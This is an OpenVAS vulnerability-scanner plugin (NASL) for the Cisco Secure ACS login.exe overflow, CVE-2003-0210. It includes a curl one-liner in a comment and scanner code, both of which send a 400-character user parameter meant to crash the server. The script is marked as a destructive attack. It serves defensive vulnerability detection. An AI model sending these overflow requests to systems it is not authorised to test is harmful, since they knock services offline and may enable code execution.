###############################################################################
# OpenVAS Vulnerability Test
# $Id: cisco_acs_web_overflow.nasl 6040 2017-04-27 09:02:38Z teissa $
#
# CISCO Secure ACS Management Interface Login Overflow
#
# Authors:
# Xue Yong Zhi <xueyong@udel.edu>
#
# Copyright:
# Copyright (C) 2003 Xue Yong Zhi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# References:
# NSFOCUS SA2003-04
# curl -i "http://host:2002/login.exe?user=`perl -e "print ('a'x400)"`&reply=any&id=1"

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11556");
  script_version("2019-04-11T14:06:24+0000");
  script_tag(name:"last_modification", value:"2019-04-11 14:06:24 +0000 (Thu, 11 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(7413);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2003-0210");
  script_name("CISCO Secure ACS Management Interface Login Overflow");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("This script is Copyright (C) 2003 Xue Yong Zhi");
  script_family("CISCO");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 2002);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Cisco has already released a patch for this problem.");

  script_tag(name:"summary", value:"It may be possible to make this Cisco Secure ACS web
  server(login.exe) execute arbitrary code by sending
  it a too long login url.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:2002 );
if( http_is_dead( port:port ) )
  exit( 0 );

if( is_cgi_installed_ka( port:port, item:"/login.exe" ) ) {

  url = string( "/login.exe?user=", crap(400), "&reply=any&id=1" );
  req = http_get( item:url, port:port );
  res = http_send_recv( port:port, data:req );

  #The request will make a vunerable server suspend until a restart
  if( http_is_dead( port:port ) ) {
    security_message( port:port );
    exit( 0 );
  }
}

exit( 99 );